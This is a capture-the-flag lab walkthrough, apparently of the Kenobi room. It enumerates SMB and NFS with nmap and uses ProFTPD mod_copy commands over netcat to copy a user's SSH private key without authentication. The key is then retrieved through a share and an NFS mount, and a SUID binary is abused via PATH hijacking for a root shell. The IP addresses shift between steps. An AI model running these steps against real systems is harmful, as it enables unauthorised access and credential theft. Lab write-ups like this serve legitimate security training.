Discovered open port 22/tcp on 10.112.171.228
Discovered open port 80/tcp on 10.112.171.228
Discovered open port 139/tcp on 10.112.171.228
Discovered open port 111/tcp on 10.112.171.228
Discovered open port 445/tcp on 10.112.171.228
Discovered open port 2049/tcp on 10.112.171.228

Using nmap we can enumerate a machine for SMB shares.

Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.112.171.228

You should have found an exploit from ProFtpd's [mod_copy module](http://www.proftpd.org/docs/contrib/mod_copy.html). 

The mod_copy module implements **SITE CPFR** and **SITE CPTO** commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.

```bash
nc 10.112.171.228 21 
# Wait for "220 ProFTPD..." 
SITE CPFR /home/kenobi/.ssh/id_rsa 
SITE CPTO /var/tmp/id_rsa 
# Expect: 250 Copy successful
```

On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.
```bash
smbclient //10.112.171.228/anonymous
```

```bash
smb: \> cd tmp
smb: \tmp\> ls
# You should now see id_rsa here
smb: \tmp\> get id_rsa
smb: \tmp\> exit
```
Download SMB share recursively.

smbget -R smb://10.113.173.153/anonymous

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.192.73

Lets mount the /var/tmp directory to our machine

```bash
mkdir /mnt/kenobiNFS  
mount 10.113.173.153:/var /mnt/kenobiNFS  
ls -la /mnt/kenobiNFS
```

![](https://assets.tryhackme.com/additional/imgur/v8Ln4fu.png)

We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.

![](https://assets.tryhackme.com/additional/imgur/Vy4KkEl.png)
![](https://assets.tryhackme.com/additional/imgur/LN2uOCJ.png)  

Lets first understand what what SUID, SGID and Sticky Bits are.

|   |   |   |
|---|---|---|
|**Permission**|**On Files**|**On Directories**|
|SUID Bit|User executes the file with permissions of the _file_ owner|-|
|SGID Bit|User executes the file with the permission of the _group_ owner.|File created in directory gets the same group owner.|
|Sticky Bit|No meaning|Users are prevented from deleting files from other users.|

Answer the questions below

SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following: find / -perm -u=s -type f 2>/dev/null

Strings is a command on Linux that looks for human readable strings on a binary.

![](https://assets.tryhackme.com/additional/imgur/toHFALv.png)

This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

![](https://assets.tryhackme.com/additional/imgur/OfMkDhW.png)

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!
